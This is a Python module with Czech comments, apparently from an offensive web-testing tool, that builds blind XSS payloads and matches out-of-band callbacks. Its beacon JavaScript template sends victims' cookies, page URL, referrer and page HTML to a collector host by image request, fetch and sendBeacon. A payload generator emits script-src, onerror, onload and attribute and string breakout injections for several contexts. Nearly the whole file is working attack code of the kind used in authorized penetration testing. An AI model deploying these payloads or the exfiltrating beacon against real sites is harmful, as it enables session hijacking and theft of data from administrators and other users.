"""
_blind_xss_oob.py — blind XSS out-of-band (OOB) infrastruktura (v10.47)

Blind XSS vystřelí tam, kam nevidíš — admin panel, log viewer, ticket systém,
HTML email. Payload injektneš do nějakého vstupu (kontaktní formulář, User-Agent,
username), ale exekuce nastane JINDE a JINDY, v kontextu, který sleduje někdo
jiný. Protože odpověď nevidíš, potřebuješ OUT-OF-BAND callback: payload při
exekuci zavolá domů na server, který ovládáš, a nese důkaz + kontext (URL kde
to vystřelilo, cookies, DOM, …).

Tento modul řeší KORELACI a PAYLOADY:
  - každý injection point dostane unikátní token
  - payloady per kontext (auto-firing carriery, které loadnou //collector/token.js)
  - korelace: callback s tokenem → injection record. Klíčový důkaz blind XSS je,
    že fired_at_url (z callbacku) ≠ injection_url.

Collector (příjem callbacků) je v _oob_collector.py. OOB je inherentně async —
spray teď, callbacky chodí minuty až dny později → korelace je oddělená fáze.
"""
import time
import secrets
from dataclasses import dataclass, field
from typing import Dict, List, Optional
from urllib.parse import urlsplit


# ── Beacon JS (servíruje collector jako /<token>.js) ───────────────────────
# Při exekuci vyexfiltruje kontext a zavolá zpět redundantně (Image GET +
# fetch POST). __COLLECTOR__ = host[:port] (bez scheme, protocol-relative),
# __TOKEN__ = korelační token, __CBPATH__ = callback path.
BEACON_JS_TEMPLATE = r"""(function(){
  try{
    var C='//__COLLECTOR____CBPATH__';
    var t='__TOKEN__';
    var enc=encodeURIComponent;
    var d={
      t:t,
      u:location.href,
      o:location.origin,
      dom:document.domain,
      ref:document.referrer,
      title:(document.title||'').slice(0,120),
      ck:document.cookie,
      html:(document.documentElement?document.documentElement.outerHTML:'').slice(0,4000)
    };
    // GET beacon (nejspolehlivější, projde i bez CORS)
    try{ new Image().src=C+'?t='+enc(t)+'&u='+enc(d.u)+'&dom='+enc(d.dom)+'&ref='+enc(d.ref); }catch(e){}
    // POST beacon (bohatší payload: cookies, DOM)
    try{ fetch(C,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify(d)}); }catch(e){}
    // sendBeacon fallback
    try{ if(navigator.sendBeacon) navigator.sendBeacon(C, JSON.stringify(d)); }catch(e){}
  }catch(e){}
})();"""


def build_beacon_js(collector_host: str, token: str, callback_path: str = "/c") -> str:
    return (BEACON_JS_TEMPLATE
            .replace("__COLLECTOR__", collector_host)
            .replace("__CBPATH__", callback_path)
            .replace("__TOKEN__", token))


@dataclass
class OOBConfig:
    collector_url: str               # plný base, např. https://oob.mydomain.com
    callback_path: str = "/c"
    js_path_suffix: str = ".js"      # //host/<token>.js
    mode: str = "http"               # http | custom | interactsh

    @property
    def collector_host(self) -> str:
        """host[:port] bez scheme — pro protocol-relative //host/… payloady."""
        try:
            p = urlsplit(self.collector_url)
            return p.netloc or self.collector_url
        except Exception:
            return self.collector_url


@dataclass
class InjectionRecord:
    token: str
    target_url: str
    param: str          # název parametru / hlavičky / form pole
    vector: str         # query | header | form | path | cookie | json
    context: str        # html | attr | js | script_src | generic
    payload: str
    timestamp: float = field(default_factory=time.time)


@dataclass
class BlindFinding:
    token: str
    injection_url: str      # kam jsme injektnuli
    param: str
    vector: str
    fired_at_url: str       # kde to reálně vystřelilo (blind důkaz!)
    exfil: Dict
    is_blind: bool          # fired_at_url != injection_url
    payload: str


# ── Payloady per kontext ───────────────────────────────────────────────────
def blind_payloads(cfg: OOBConfig, token: str,
                   contexts: Optional[List[str]] = None) -> Dict[str, List[str]]:
    """Auto-firing payloady, které loadnou //collector/<token>.js (XSS Hunter
    model: těžkou práci dělá servírovaný JS). Per kontext varianty."""
    host = cfg.collector_host
    src = f"//{host}/{token}{cfg.js_path_suffix}"
    loader = (f"var s=document.createElement('script');s.src='{src}';"
              f"(document.body||document.head||document.documentElement)"
              f".appendChild(s)")
    by_ctx: Dict[str, List[str]] = {
        "html": [
            f'<script src={src}></script>',
            f'<img src=x onerror="{loader}">',
            f'<svg/onload="{loader}">',
        ],
        "attr": [
            f'"><script src={src}></script>',
            f"'><script src={src}></script>",
            f'" onfocus="{loader}" autofocus="',
        ],
        "js": [
            f"';{loader};//",
            f'";{loader};//',
            f"`-({loader})-`",
        ],
        "script_src": [
            src,                                   # přímo do src= sinku
            f"//{host}/{token}{cfg.js_path_suffix}",
        ],
        "generic": [
            f'"><script src={src}></script>',
            f'<script src={src}></script>',
        ],
    }
    if contexts:
        return {k: v for k, v in by_ctx.items() if k in contexts}
    return by_ctx


class BlindXSSOrchestrator:
    """Spravuje tokeny, injection mapu a korelaci callbacků."""

    def __init__(self, cfg: OOBConfig):
        self.cfg = cfg
        self._records: Dict[str, InjectionRecord] = {}

    def new_token(self) -> str:
        return secrets.token_hex(6)

    def register(self, target_url: str, param: str, vector: str,
                 context: str, payload: str, token: Optional[str] = None
                 ) -> InjectionRecord:
        token = token or self.new_token()
        rec = InjectionRecord(token=token, target_url=target_url, param=param,
                              vector=vector, context=context, payload=payload)
        self._records[token] = rec
        return rec

    def payloads_for(self, target_url: str, param: str, vector: str,
                     context: str = "generic") -> List[InjectionRecord]:
        """Vygeneruje + zaregistruje payloady pro jeden injection point.
        Každá varianta dostane vlastní token (přesná korelace, který carrier
        vystřelil)."""
        out: List[InjectionRecord] = []
        variants = blind_payloads(self.cfg, "TKTK", [context]).get(context, [])
        for tpl in variants:
            tok = self.new_token()
            # vygeneruj payload s reálným tokenem (ne placeholderem)
            real = blind_payloads(self.cfg, tok, [context]).get(context, [])
            payload = real[variants.index(tpl)] if variants.index(tpl) < len(real) else real[0]
            out.append(self.register(target_url, param, vector, context, payload, tok))
        return out

    @property
    def injection_map(self) -> Dict[str, InjectionRecord]:
        return dict(self._records)

    def export_map(self) -> List[Dict]:
        return [{
            "token": r.token, "target_url": r.target_url, "param": r.param,
            "vector": r.vector, "context": r.context, "payload": r.payload,
            "timestamp": r.timestamp,
        } for r in self._records.values()]

    def load_map(self, items: List[Dict]):
        for it in items or []:
            tok = it.get("token")
            if not tok:
                continue
            self._records[tok] = InjectionRecord(
                token=tok, target_url=it.get("target_url", ""),
                param=it.get("param", ""), vector=it.get("vector", ""),
                context=it.get("context", ""), payload=it.get("payload", ""),
                timestamp=it.get("timestamp", time.time()))

    def correlate(self, callbacks: List[Dict]) -> List[BlindFinding]:
        """Spáruj přijaté callbacky (z collectoru) s injection recordy podle
        tokenu. Vrátí blind findings; is_blind=True když fired_at_url ≠ injection."""
        findings: List[BlindFinding] = []
        seen = set()
        for cb in callbacks or []:
            tok = cb.get("token") or cb.get("t")
            if not tok or tok not in self._records:
                continue
            fired = cb.get("u") or cb.get("url") or cb.get("location") or ""
            key = (tok, fired)
            if key in seen:
                continue
            seen.add(key)
            rec = self._records[tok]
            inj_origin = _origin(rec.target_url)
            fired_origin = _origin(fired)
            is_blind = bool(fired) and (fired_origin != inj_origin
                                        or _path(fired) != _path(rec.target_url))
            findings.append(BlindFinding(
                token=tok, injection_url=rec.target_url, param=rec.param,
                vector=rec.vector, fired_at_url=fired, exfil=cb,
                is_blind=is_blind, payload=rec.payload))
        return findings


def _origin(url: str) -> str:
    try:
        p = urlsplit(url)
        return f"{p.scheme}://{p.netloc}".lower()
    except Exception:
        return ""


def _path(url: str) -> str:
    try:
        return urlsplit(url).path or "/"
    except Exception:
        return url
